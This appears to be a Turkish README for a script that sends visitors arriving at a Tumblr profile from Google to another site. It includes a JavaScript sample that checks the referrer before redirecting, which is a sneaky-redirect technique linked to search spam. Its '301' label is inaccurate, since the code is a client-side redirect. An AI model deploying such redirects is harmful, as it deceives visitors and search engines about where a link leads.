# Tumblr 301 Yönlendirme Kodu

Bu proje, Google'dan gelen ve bir Tumblr profiline giren kullanıcıları başka bir siteye yönlendirmek amacıyla geliştirilmiştir. Web ve mobil ortamda çalışabilir.

## Kullanılan Teknolojiler

- HTML
- CSS
- JavaScript

## Kurulum

Projenizi yerel ortamda çalıştırmak için aşağıdaki adımları izleyin:

1. Bu depoyu klonlayın:
    ```sh
    git clone https://github.com/kullanici/proje-adi.git
    ```

2. Proje dizinine gidin:
    ```sh
    cd proje-adi
    ```

3. Gerekli bağımlılıkları yükleyin (gerekliyse):
    ```sh
    npm install
    ```

## Kullanım

Yönlendirme kodunu çalıştırmak için aşağıdaki adımları izleyin:

1. `index.html` dosyasını bir tarayıcıda açın.
2. Google'dan gelen ve Tumblr profiline giren kullanıcılar otomatik olarak başka bir siteye yönlendirilecektir.

### Örnek Kod

Aşağıda, kullanıcıyı yönlendirme kodunun bir örneği verilmiştir:

```html
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kullanıcı Yönlendirme</title>
    <script>
        document.addEventListener("DOMContentLoaded", function() {
            var referrer = document.referrer;
            if (referrer.includes("google.com") && window.location.href.includes("tumblr.com")) {
                window.location.href = "https://www.x.com";
            }
        });
    </script>
</head>
<body>
    <h1>Hoşgeldiniz!</h1>
    <p>Google'dan gelen ve Tumblr profiline giren kullanıcılar yönlendiriliyor...</p>
</body>
</html>
